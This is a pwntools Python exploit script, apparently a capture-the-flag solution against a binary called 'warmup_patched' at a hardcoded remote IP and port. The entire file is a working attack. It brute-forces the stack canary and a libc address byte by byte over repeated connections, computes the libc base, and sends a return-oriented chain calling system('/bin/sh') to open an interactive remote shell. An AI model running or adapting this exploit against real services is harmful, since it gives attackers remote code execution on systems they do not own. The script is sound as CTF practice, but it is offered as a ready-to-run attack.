#!/usr/bin/python3

from pwn import *
HOST = "34.76.152.107"
PORT = 8486
exe = ELF('warmup_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "CRITICAL"
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)



# GDB()
canary = []
for i in range (8):
    for j in range(0x100):
        while(True):
            try:
                p = remote(HOST, PORT, timeout=5)
                break
            except:
                j-=1
                sleep(3)
                continue
        payload = b"a" * 56 + b"".join([p8(b) for b in canary]) + p8(j)
        s(payload)
        data = p.recvrepeat(timeout=10)
        print(f"Trying: {hex(j)}")
        
        if b"*** stack smashing detected ***" not in data:
            canary.append(j)
            info(f"Canary: {canary}")
            p.close()
            
            break
        p.close()

# canary = [0, 147, 254, 204, 255, 245, 15, 77]
payload = b"a" * 56 + b"".join([p8(x) for x in canary]) + p64(0x123)
libc_leak = [0x76]
for i in range(8):
    for j in range(0, 0x100):
        while(True):
            try:
                p = remote(HOST, PORT, timeout=5)
                break
            except:
                j-=1
                sleep(3)
                continue
        s(payload + b"".join([p8(x) for x in libc_leak]) + p8(j))
        data = p.recvrepeat(timeout=10)
        if b"This is helper for you" in data:
            libc_leak.append(j)
            info(f"Libc: {libc_leak}")
            p.close()
            break
        p.close()
p = remote(HOST, PORT, timeout=5)

# libc_leak = [118, 154, 141, 41, 189, 127, 0, 0, 0]
libc_leak = libc_leak[::-1]
libc_leak = "0x" + "".join(hex(x)[2:] for x in libc_leak)
libc_leak = int(libc_leak, 16)
libc.address = libc_leak - 0x23a76
info("libc leak: " + hex(libc.address))
pop_rdi = libc.address + 0x00000000000240e5
payload += flat(
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.address + 0x0000000000022fd9, libc.sym['system']
)
s(payload)
p.interactive()
